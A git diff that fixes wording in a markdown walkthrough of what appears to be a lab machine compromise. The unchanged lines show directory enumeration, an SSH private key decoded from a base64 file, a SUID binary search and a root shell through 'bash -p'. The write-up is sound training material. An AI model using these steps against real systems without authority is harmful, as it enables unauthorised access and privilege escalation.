@@ -31,7 +31,7 @@ $ dirb http://192.168.59.89`
 > Additionally `dirb` was able to identify the files `robots.txt` and `secret.txt`
 {: .prompt-info}
 
-- `robots.txt`: `/secret.txt`
+- `robots.txt`: contains the path `/secret.txt`
 - `secret.txt`: contains a `base64` blob
 
 ---
@@ -46,7 +46,7 @@ $ base64 -d blob.base64
 > The decoding reveals that it is an `ssh` private key!
 {: .prompt-info}
 
-### generate the public key out of private key to get `username`
+### generate the public key out of the private key to get the `username`
 ```bash
 ssh-keygen -f ssh.priv -y > ssh.pub
 ```
@@ -65,7 +65,7 @@ bash-5.0$ cat local.txt
 
 # post exploitation
 ## privilege escalation
-identifiy `SUID` binaries owned by `root`
+Identifiy `SUID` binaries owned by `root`
 ```bash
 $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ...
@@ -73,7 +73,7 @@ $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/nul
 ...
 ```
 
-The website [gtfobins](https://gtfobins.github.io/gtfobins/bash/#suid) reveals that the binars `bash` can be exploited to gain `root` access.
+The website [gtfobins](https://gtfobins.github.io/gtfobins/bash/#suid) reveals that the binary `bash` can be exploited to gain `root` access.
 
 ```bash
 -bash-5.0$ /usr/bin/bash -p
